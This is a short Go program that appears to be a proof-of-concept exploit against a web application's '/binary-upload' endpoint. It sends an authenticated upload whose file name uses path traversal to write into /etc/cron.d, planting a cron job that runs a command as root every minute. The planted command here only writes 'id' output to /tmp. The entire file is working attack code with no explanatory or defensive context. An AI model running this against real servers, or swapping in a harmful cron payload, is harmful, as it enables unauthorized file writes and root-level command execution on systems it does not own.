package main
import (
 "bytes"
 "encoding/binary"
 "net/http"
 "os"
)
func main() {
 name := []byte("../../../../../etc/cron.d/nightly_probe")
 body := []byte("* * * * * root id > /tmp/account_proof\n")
 frame := new(bytes.Buffer)
 for _, n := range []uint32{1, 1, 1, uint32(len(body)), uint32(len(name))} {
  binary.Write(frame, binary.BigEndian, n)
 }
 frame.Write(name)
 frame.Write(body)
 req, _ := http.NewRequest("POST", os.Args[1]+"/binary-upload", frame)
 req.Header.Set("Content-Type", "application/octet-stream")
 req.Header.Set("Cookie", "JSESSIONID="+os.Args[2])
 http.DefaultClient.Do(req)
}
